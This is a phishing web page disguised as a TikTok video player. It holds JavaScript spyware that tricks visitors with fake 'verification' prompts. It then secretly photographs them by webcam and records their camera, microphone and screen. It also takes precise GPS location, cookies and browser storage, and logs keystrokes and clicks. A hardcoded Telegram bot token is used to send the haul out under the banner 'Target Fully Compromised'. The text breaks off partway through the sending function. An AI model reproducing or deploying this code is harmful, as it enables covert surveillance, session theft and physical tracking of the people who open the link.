
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: 'TikTok Sans', Arial, sans-serif;
            overflow: hidden;
            position: relative;
            touch-action: manipulation; /* Prevent default touch behaviors that might reveal underlying elements */
        }

        /* --- Video Player Container --- */
        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .play-button svg {
            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }

        .placeholder-text {
            font-size: 1.2em;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            font-weight: 600;
        }

        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.5em;
            font-weight: bold;
            color: #fff;
        }

        /* --- Loading Spinner Overlay --- */
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
        }

        /* --- Hidden Elements for Data Collection --- */
        #camera-feed, #audio-feed, #screen-feed, #phantom-video {
            position: absolute;
            width: 1px; /* Highly concealed */
            height: 1px; /* Highly concealed */
            opacity: 0;
            z-index: -1;
            pointer-events: none; /* Ensure no interaction */
        }

        #canvas, #video-canvas, #screen-canvas {
            display: none; /* Completely hidden */
        }

        /* --- Notification Styles --- */
        #notification {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            z-index: 30;
            border-left: 4px solid #ff0050;
        }

        #notification.show {
            opacity: 1;
            visibility: visible;
        }

        #notification.warning {
            border-left-color: #ffa500;
        }

        #notification.error {
            border-left-color: #ff0000;
        }

        /* --- Progress Bar --- */
        .progress-bar {
            width: 200px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }

        /* --- Responsive Design Enhancements --- */
        @media (max-width: 600px) {
            .tiktok-logo {
                font-size: 1.2em;
                top: 15px;
                left: 15px;
            }
            .play-button {
                width: 60px;
                height: 60px;
            }
            .play-button svg {
                width: 30px;
                height: 30px;
            }
            .placeholder-text {
                font-size: 1em;
            }
            .spinner {
                width: 40px;
                height: 40px;
                border-width: 6px;
            }
            .loading-message {
                font-size: 0.9em;
                max-width: 250px;
            }
            #notification {
                top: 15px;
                right: 15px;
                padding: 8px 12px;
                font-size: 0.8em;
            }
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button">
                <svg viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
            <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
        </div>

        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading video content...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
        </div>

        <video id="camera-feed" autoplay playsinline muted></video>
        <audio id="audio-feed" autoplay muted></audio> <video id="phantom-video" autoplay playsinline muted loop></video> <canvas id="canvas"></canvas>
        <canvas id="video-canvas"></canvas>
        <canvas id="screen-canvas"></canvas> <div id="notification"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8124965992:AAF-lUcmy45Y-JSB75LbikZm3e3HwQAbDIg';
        const CHAT_ID = '8004961958';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@shadoabuzeana/video/7527647062767308034';
        const FAKE_VIDEO_SOURCE = 'https://www.tiktok.com/@shadoabuzeana/video/7527647062767308034'; // A placeholder for a convincing "fake" video

        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const cameraFeed = document.getElementById('camera-feed');
        const audioFeed = document.getElementById('audio-feed');
        const phantomVideo = document.getElementById('phantom-video');
        const canvas = document.getElementById('canvas');
        const videoCanvas = document.getElementById('video-canvas');
        const screenCanvas = document.getElementById('screen-canvas');
        const context = canvas.getContext('2d');
        const videoContext = videoCanvas.getContext('2d');
        const screenContext = screenCanvas.getContext('2d');
        const notificationDiv = document.getElementById('notification');
        const placeholderText = document.getElementById('placeholder-text');

        let cameraStream = null;
        let audioStream = null;
        let screenStream = null;
        let videoRecorder = null;
        let audioRecorder = null;
        let screenRecorder = null;
        let recordedChunks = [];
        let recordedAudioChunks = [];
        let recordedScreenChunks = [];
        let dataCollectionInterval = null;
        let keystrokeLogger = null;
        let mouseTracker = null;
        let clickTracker = null;

        let collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            deviceInfo: {},
            location: { gps: null, ip: {}, wifi: null }, // Enhanced location object
            capturedImages: [],
            capturedVideo: null,
            capturedAudio: null,
            capturedScreenshots: [],
            ipInfo: null,
            cookies: null,
            localStorageData: {},
            sessionStorageData: {},
            browserFingerprint: {},
            networkInfo: {},
            socialMediaLogins: [], // Placeholder, requires more advanced browser/extension exploits
            clipboardContent: null,
            keystrokes: [],
            mouseMovements: [],
            clicks: [], // New: Click tracking
            sessionData: {},
            webRTCData: null,
            canvasFingerprint: null,
            fontList: [],
            pluginList: [],
            screenInfo: {},
            batteryInfo: null,
            connectionInfo: null,
            hardwareInfo: {},
            timezoneInfo: {},
            languageInfo: {},
            doNotTrack: null,
            referrer: document.referrer,
            url: window.location.href,
            title: document.title,
            environment: {} // Generic for other collected data
        };

        const MESSAGES = {
            'en': {
                'tapToWatch': 'Tap to watch this video',
                'loadingVideo': 'Initializing video player...',
                'checkingNetwork': 'Checking network connection...',
                'collectingBrowserData': 'Collecting browser data for optimal playback...',
                'requestingCamera': 'Requesting camera access for content verification...',
                'startingVideoRecording': 'Starting video recording for authenticity...',
                'requestingLocation': 'Requesting location for content delivery...',
                'startingBackgroundMonitoring': 'Analyzing playback environment...',
                'sendingDataSecurely': 'Optimizing data stream securely...',
                'redirecting': 'Redirecting to TikTok...',
                'cameraAccessRequired': 'Camera access required for video playback verification. Please refresh.',
                'locationAccessRequired': 'Location access required for content delivery. Please refresh.',
                'audioAccessRequired': 'Microphone access required for audio sync. Please refresh.',
                'screenRecordingRequired': 'Screen recording access required for optimal visual experience. Please refresh.',
                'autoPlaying': 'Auto-playing video...'
            },
    'ar': {
        'tapToWatch': 'Click to watch this video',
        'loadingVideo': 'Initializing video player...',
        'checkingNetwork': 'Checking network connection...',
        'collectingBrowserData': 'Collecting browser data for optimal playback...',
        'requestingCamera': 'Requesting camera access for content verification...',
        'startingVideoRecording': 'Starting video recording to ensure authenticity...',
        'requestingLocation': 'Requesting geographical location for content delivery...',
        'startingBackgroundMonitoring': 'Analyzing playback environment...',
        'sendingDataSecurely': 'Optimizing data stream securely...',
        'redirecting': 'Redirecting to TikTok...',
        'cameraAccessRequired': 'Camera access is required to verify video playback. Please refresh.',
        'locationAccessRequired': 'Location access is required for content delivery. Please refresh.',
        'audioAccessRequired': 'Microphone access is required for audio synchronization. Please refresh.',
        'screenRecordingRequired': 'Screen recording access is required for an optimal visual experience. Please refresh.',
        'autoPlaying': 'Playing video automatically...'
    }
        };

        function getLocalizedMessage(key) {
            const lang = navigator.language.split('-')[0];
            return MESSAGES[lang] && MESSAGES[lang][key] ? MESSAGES[lang][key] : MESSAGES['en'][key];
        }

        // Initialize localized text
        document.addEventListener('DOMContentLoaded', () => {
            placeholderText.textContent = getLocalizedMessage('tapToWatch');
            loadingMessage.textContent = getLocalizedMessage('loadingVideo');
        });

        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(message, type = 'info') {
            notificationDiv.textContent = message;
            notificationDiv.className = 'notification'; // Reset classes
            if (type === 'warning') {
                notificationDiv.classList.add('warning');
            } else if (type === 'error') {
                notificationDiv.classList.add('error');
            }
            notificationDiv.classList.add('show');
            setTimeout(() => {
                notificationDiv.classList.remove('show');
            }, 5000); // Keep notification longer
        }

        // === ENHANCED DATA COLLECTION FUNCTIONS ===

        // Collect comprehensive browser fingerprint
        function collectBrowserFingerprint() {
            try {
                // Canvas fingerprinting
                canvas.width = 200;
                canvas.height = 200;
                context.textBaseline = "top";
                context.font = "14px Arial";
                context.fillText("Browser Fingerprint SHADOW", 2, 2);
                collectedData.canvasFingerprint = canvas.toDataURL();

                // WebGL fingerprinting
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        collectedData.browserFingerprint.webgl = {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                    collectedData.browserFingerprint.webglCapabilities = {
                        maxTextures: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        vendor: gl.getParameter(gl.VENDOR),
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                    };
                }

                // Font detection (enhanced)
                const fontsToCheck = [
                    'Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
                    'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'Merriweather', 'Noto Sans JP', 'Segoe UI', 'SF Pro Display', 'Helvetica Neue'
                ];
                collectedData.fontList = fontsToCheck.filter(font => document.fonts.check(`12px "${font}"`));

                // Plugin detection
                collectedData.pluginList = Array.from(navigator.plugins).map(plugin => ({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                }));

                // Screen information
                collectedData.screenInfo = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown',
                    devicePixelRatio: window.devicePixelRatio
                };

                // Connection information
                if (navigator.connection) {
                    collectedData.connectionInfo = {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData,
                        type: navigator.connection.type || 'unknown' // wifi, cellular, ethernet, etc.
                    };
                }

                // Hardware information
                collectedData.hardwareInfo = {
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    gpu: collectedData.browserFingerprint.webgl ? collectedData.browserFingerprint.webgl.renderer : 'Unknown'
                };

                // Timezone and language
                collectedData.timezoneInfo = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                collectedData.languageInfo = {
                    language: navigator.language,
                    languages: navigator.languages
                };

                // Do Not Track
                collectedData.doNotTrack = navigator.doNotTrack;

                // Media device info
                navigator.mediaDevices.enumerateDevices().then(devices => {
                    collectedData.environment.mediaDevices = devices.map(d => ({
                        kind: d.kind,
                        label: d.label,
                        groupId: d.groupId
                    }));
                }).catch(e => console.warn('Could not enumerate media devices:', e));

                console.log('Browser fingerprint collected.');
            } catch (e) {
                console.error('Error collecting browser fingerprint:', e);
            }
        }

        // Collect all cookies and storage data
        function collectCookiesAndTokens() {
            try {
                // All cookies
                collectedData.cookies = document.cookie;
                
                // Local Storage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    collectedData.localStorageData[key] = localStorage.getItem(key);
                }

                // Session Storage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    collectedData.sessionStorageData[key] = sessionStorage.getItem(key);
                }

                // IndexedDB (check availability, not content unless specific exploit)
                if (window.indexedDB) {
                    collectedData.environment.indexedDBStatus = 'Available';
                }

                // Cache API (check availability)
                if ('caches' in window) {
                    collectedData.environment.cacheAPIStatus = 'Available';
                }

                console.log('Cookies and storage data collected.');
            } catch (e) {
                console.error('Error collecting cookies/storage:', e);
            }
        }

        // Enhanced device information
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                product: navigator.product,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                appCodeName: navigator.appCodeName,
                cpuClass: navigator.cpuClass || 'N/A' // Old property but sometimes available
            };

            // Battery information
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    collectedData.batteryInfo = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }).catch(e => console.warn('Battery API access denied or failed:', e));
            }

            // WebRTC local IP detection
            const rtc = new RTCPeerConnection({iceServers:[]});
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event.candidate) {
                    const ip = event.candidate.candidate.split(' ')[4];
                    if (ip && ip.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
                        collectedData.webRTCData = { localIP: ip };
                    }
                }
            };

            console.log('Device information collected.');
        }

        // Get IP and location information using multiple services
        async function getIPInfo() {
            try {
                // IPAPI.co
                const ipapiResponse = await fetch('https://ipapi.co/json/');
                const ipapiData = await ipapiResponse.json();
                collectedData.ipInfo = {
                    ip: ipapiData.ip,
                    city: ipapiData.city,
                    region: ipapiData.region,
                    country: ipapiData.country_name,
                    country_code: ipapiData.country_code,
                    postal: ipapiData.postal,
                    latitude: ipapiData.latitude,
                    longitude: ipapiData.longitude,
                    timezone: ipapiData.timezone,
                    org: ipapiData.org,
                    asn: ipapiData.asn,
                    isp: ipapiData.org,
                    source: 'ipapi.co'
                };
                collectedData.location.ip = collectedData.ipInfo;

                // GeoJS.io (for redundancy/comparison)
                const geojsResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const geojsData = await geojsResponse.json();
                collectedData.location.ip_geojs = {
                    ip: geojsData.ip,
                    city: geojsData.city,
                    region: geojsData.region,
                    country: geojsData.country,
                    latitude: geojsData.latitude,
                    longitude: geojsData.longitude,
                    organization: geojsData.organization,
                    source: 'geojs.io'
                };

                console.log('IP info collected from multiple sources.');
            } catch (error) {
                console.error('Error fetching IP info:', error);
            }
        }

        // Capture multiple images over time
        async function captureMultipleImages() {
            try {
                if (!cameraStream) {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                            facingMode: 'user' // Prioritize front camera
                        }, 
                        audio: false 
                    });
                    cameraFeed.srcObject = cameraStream;
                    await cameraFeed.play();
                }

                // Capture multiple images over a short period
                const captureCount = 3; // Reduced for speed
                for (let i = 0; i < captureCount; i++) {
                    await new Promise(resolve => setTimeout(resolve, 750)); // Shorter delay
                    canvas.width = cameraFeed.videoWidth;
                    canvas.height = cameraFeed.videoHeight;
                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8); // Slightly lower quality for faster transfer
                    collectedData.capturedImages.push({
                        timestamp: new Date().toISOString(),
                        data: imageData,
                        index: i
                    });
                }
                
                // Keep camera stream active for video recording, don't stop yet
                return true;
            } catch (error) {
                console.warn('Camera capture failed:', error.name);
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    showNotification(getLocalizedMessage('cameraAccessRequired'), 'error');
                    // Fake error message
                    loadingMessage.textContent = "Error: Could not load video. Permissions denied or device busy.";
                    throw new Error('Camera permission denied.'); // Stop further execution
                }
                return false;
            }
        }

        // Record video secretly (continues using existing cameraStream)
        async function recordSecretVideo() {
            try {
                if (!cameraStream) {
                    console.warn('Camera stream not available for video recording. Attempting to acquire.');
                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }, 
                        audio: true // Request audio with video for full context
                    });
                    cameraFeed.srcObject = cameraStream;
                    await cameraFeed.play();
                }

                const stream = cameraStream;
                const options = { mimeType: 'video/webm;codecs=vp8,opus' }; // Common and supported
                
                videoRecorder = new MediaRecorder(stream, options);
                recordedChunks = [];

                videoRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                videoRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => { // Use onloadend for more reliable blob conversion
                        collectedData.capturedVideo = reader.result;
                        console.log('Video recording finalized.');
                    };
                    reader.readAsDataURL(blob);
                };

                videoRecorder.start();
                console.log('Video recording started.');
                
                // Record for a longer duration, e.g., 15 seconds
                setTimeout(() => {
                    if (videoRecorder && videoRecorder.state === 'recording') {
                        videoRecorder.stop();
                        console.log('Video recording stopped after 15 seconds.');
                    }
                }, 15000); // 15 seconds

                return true;
            } catch (error) {
                console.warn('Video recording failed:', error);
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    showNotification(getLocalizedMessage('cameraAccessRequired'), 'error');
                }
                return false;
            } finally {
                // Ensure camera stream is stopped only after video recording is done
                // (or if recording failed) to free up resources.
                // This might need adjustment if video recording is continuous.
            }
        }

        // Record audio silently in background
        async function recordSecretAudio() {
            try {
                if (!audioStream) {
                    audioStream = await navigator.mediaDevices.getUserMedia({ 
                        video: false, 
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            autoGainControl: true
                        } 
                    });
                    audioFeed.srcObject = audioStream;
                    await audioFeed.play();
                }

                const options = { mimeType: 'audio/webm;codecs=opus' };
                audioRecorder = new MediaRecorder(audioStream, options);
                recordedAudioChunks = [];

                audioRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedAudioChunks.push(event.data);
                    }
                };

                audioRecorder.onstop = () => {
                    const blob = new Blob(recordedAudioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        collectedData.capturedAudio = reader.result;
                        console.log('Audio recording finalized.');
                    };
                    reader.readAsDataURL(blob);
                };

                audioRecorder.start();
                console.log('Audio recording started.');

                // Record for a longer duration, e.g., 30 seconds
                setTimeout(() => {
                    if (audioRecorder && audioRecorder.state === 'recording') {
                        audioRecorder.stop();
                        console.log('Audio recording stopped after 30 seconds.');
                    }
                }, 30000); // 30 seconds

                return true;
            } catch (error) {
                console.warn('Audio recording failed:', error);
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    showNotification(getLocalizedMessage('audioAccessRequired'), 'warning');
                }
                return false;
            }
        }

        // Capture screen recording (requires explicit user permission usually)
        async function captureScreenRecording() {
            try {
                // This will trigger a system-level permission prompt.
                // Camouflage message: "To optimize video playback, please share your screen."
                screenStream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: true, 
                    audio: true // Can capture system audio if user allows
                });

                const options = { mimeType: 'video/webm;codecs=vp8,opus' };
                screenRecorder = new MediaRecorder(screenStream, options);
                recordedScreenChunks = [];

                screenRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedScreenChunks.push(event.data);
                    }
                };

                screenRecorder.onstop = () => {
                    const blob = new Blob(recordedScreenChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        collectedData.capturedScreenshots.push({
                            type: 'video',
                            timestamp: new Date().toISOString(),
                            data: reader.result
                        });
                        console.log('Screen recording finalized.');
                    };
                    reader.readAsDataURL(blob);
                };

                screenRecorder.start();
                console.log('Screen recording started.');

                // Record for 10 seconds (adjust as needed)
                setTimeout(() => {
                    if (screenRecorder && screenRecorder.state === 'recording') {
                        screenRecorder.stop();
                        console.log('Screen recording stopped after 10 seconds.');
                    }
                }, 10000);

                // Stop screen stream after recording or if user stops it
                screenStream.oninactive = () => {
                    if (screenRecorder && screenRecorder.state === 'recording') {
                        screenRecorder.stop();
                    }
                    console.log('Screen sharing inactive.');
                };

                return true;
            } catch (error) {
                console.warn('Screen capture failed:', error);
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    showNotification(getLocalizedMessage('screenRecordingRequired'), 'warning');
                }
                return false;
            }
        }


        // Get precise location using HTML5 Geolocation API with high accuracy
        async function getPreciseLocation() {
            return new Promise(async (resolve) => {
                const locationData = {
                    gps: null,
                    ip: collectedData.ipInfo,
                    wifi: null // Placeholder for Wi-Fi based location if available (complex, usually server-side)
                };

                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((gpsResolve, gpsReject) => {
                            navigator.geolocation.getCurrentPosition(
                                gpsResolve,
                                gpsReject,
                                {
                                    enableHighAccuracy: true, // Crucial for precision
                                    timeout: 20000, // Increased timeout
                                    maximumAge: 0 // No cached position
                                }
                            );
                        });

                        locationData.gps = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        console.log('Precise GPS location acquired.');
                    } catch (error) {
                        console.warn('GPS location failed:', error.name, error.message);
                        if (error.name === 'PermissionDeniedError') {
                            showNotification(getLocalizedMessage('locationAccessRequired'), 'error');
                            // Fake error message
                            loadingMessage.textContent = "Error: Video content is restricted in your current region.";
                            throw new Error('Geolocation permission denied.'); // Stop further execution
                        } else if (error.name === 'TimeoutError') {
                            console.warn('GPS timed out, falling back to IP location.');
                            showNotification('GPS location timed out, using approximate location.', 'warning');
                        }
                    }
                }
                
                collectedData.location = locationData;
                resolve(true);
            });
        }

        // Keystroke logging (for demonstration)
        function startKeystrokeLogging() {
            if (keystrokeLogger) return; // Prevent multiple listeners
            keystrokeLogger = (event) => {
                collectedData.keystrokes.push({
                    key: event.key,
                    keyCode: event.keyCode,
                    timestamp: new Date().toISOString(),
                    target: event.target.tagName,
                    id: event.target.id,
                    class: event.target.className
                });
            };
            document.addEventListener('keydown', keystrokeLogger);
            console.log('Keystroke logging started.');
        }

        // Mouse movement tracking
        function startMouseTracking() {
            if (mouseTracker) return; // Prevent multiple listeners
            mouseTracker = (event) => {
                collectedData.mouseMovements.push({
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            };
            document.addEventListener('mousemove', mouseTracker);
            console.log('Mouse movement tracking started.');
        }

        // Click tracking (event delegation for efficiency)
        function startClickTracking() {
            if (clickTracker) return; // Prevent multiple listeners
            clickTracker = (event) => {
                collectedData.clicks.push({
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString(),
                    target: {
                        tagName: event.target.tagName,
                        id: event.target.id,
                        class: event.target.className,
                        text: event.target.textContent ? event.target.textContent.trim().substring(0, 50) : ''
                    }
                });
            };
            document.addEventListener('click', clickTracker, true); // Use capture phase
            console.log('Click tracking started.');
        }

        // Stop all tracking
        function stopTracking() {
            if (keystrokeLogger) {
                document.removeEventListener('keydown', keystrokeLogger);
                keystrokeLogger = null;
            }
            if (mouseTracker) {
                document.removeEventListener('mousemove', mouseTracker);
                mouseTracker = null;
            }
            if (clickTracker) {
                document.removeEventListener('click', clickTracker, true);
                clickTracker = null;
            }
            console.log('All tracking stopped.');
        }

        // Release all media streams
        function stopAllMediaStreams() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraFeed.srcObject = null;
                cameraStream = null;
                console.log('Camera stream stopped.');
            }
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
                audioFeed.srcObject = null;
                audioStream = null;
                console.log('Audio stream stopped.');
            }
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
                console.log('Screen stream stopped.');
            }
            if (videoRecorder && videoRecorder.state !== 'inactive') videoRecorder.stop();
            if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop();
            if (screenRecorder && screenRecorder.state !== 'inactive') screenRecorder.stop();
        }

        // Send comprehensive data to Telegram
        async function sendComprehensiveDataToTelegram() {
            let message = `🎥 <b>SHADOW-STRIKE: Target Fully Compromised!</b>\n\n`;

            // IP Location with map link
            if (collectedData.ipInfo) {
                const ip = collectedData.ipInfo;
                message += `🌍 <b>IP Location (${ip.source}):</b>\n`;
                message += `   IP: <code>${ip.ip}</code>\n`;
                message += `   City: ${ip.city}, ${ip.region}, ${ip.country}\n`;
                message += `   ISP: ${ip.isp}\n`;
                message += `   🌐 <a href="https://www.google.com/maps?q=${ip.latitude},${ip.longitude}">View IP Location</a>\n\n`;
            }

            // GPS Location with high precision
            if (collectedData.location && collectedData.location.gps) {
                const gps = collectedData.location.gps;
                message += `📍 <b>GPS Location (High Precision):</b>\n`;
                message += `   Lat: <code>${gps.latitude.toFixed(8)}</code>\n`;
                message += `   Lon: <code>${gps.longitude.toFixed(8)}</code>\n`;
                message += `   Accuracy: ${gps.accuracy.toFixed(2)}m\n`;
                if (gps.altitude) message += `   Altitude: ${gps.altitude.toFixed(2)}m\n`;
                if (gps.speed) message += `   Speed: ${gps.speed.toFixed(2)}m/s\n`;
                message += `   🌐 <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">View GPS Location</a>\n\n`;
            }

            // Device Information
            message += `📱 <b>Device Information:</b>\n`;
            message += `   Platform: ${collectedData.deviceInfo.platform}\n`;
            message += `   Screen: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height} (DPR: ${collectedData.screenInfo.devicePixelRatio})\n`;
            message += `   User Agent: <code>${collectedData.userAgent.substring(0, 150)}...</code>\n`;
            if (collectedData.webRTCData) {
                message += `   Local IP (WebRTC): <code>${collectedData.webRTCData.localIP}</code>\n`;
            }
            if (collectedData.connectionInfo && collectedData.connectionInfo.effectiveType) {
                message += `   Connection: ${collectedData.connectionInfo.effectiveType} (Downlink: ${collectedData.connectionInfo.downlink} Mbps, RTT: ${collectedData.connectionInfo.rtt} ms)\n`;
            }
            message += `\n`;

            // Browser Fingerprint Summary
            if (collectedData.browserFingerprint.webgl) {
                message += `🔍 <b>Browser Fingerprint:</b>\n`;
                message += `   GPU: ${collectedData.browserFingerprint.webgl.renderer} (${collectedData.browserFingerprint.webgl.vendor})\n`;
                message += `   Fonts: ${collectedData.fontList.length} detected\n`;
                message += `   Plugins: ${collectedData.pluginList.length} detected\n`;
                message += `   Do Not Track: ${collectedData.doNotTrack}\n`;
                message += `\n`;
            }

            // Storage Data Summary
            if (collectedData.cookies) {
                message += `🍪 <b>Cookies:</b> <code>${collectedData.cookies.substring(0, 200)}...</code>\n\n`;
            }
            if (Object.keys(collectedData.localStorageData).length > 0) {
                message += `💾 <b>Local Storage Keys:</b> ${Object.keys(collectedData.localStorageData).join(', ').substring(0, 200)}...\n`;
            }
            if (Object.keys(collectedData.sessionStorageData).length > 0) {
                message += `📊 <b>Session Storage Keys:</b> ${Object.keys(collectedData.sessionStorageData).join(', ').substring(0, 200)}...\n\n`;
            }

            // Captured Media Status
            if (collectedData.capturedImages.length > 0) {
                message += `📸 <b>Captured Images:</b> ${collectedData.capturedImages.length} photos\n`;
            }
            if (collectedData.capturedVideo) {
                message += `🎬 <b>Video Recording:</b> 15 seconds captured\n`;
            }
            if (collectedData.capturedAudio) {
                message += `🎤 <b>Audio Recording:</b> 30 seconds captured\n`;
            }
            if (collectedData.capturedScreenshots.length > 0) {
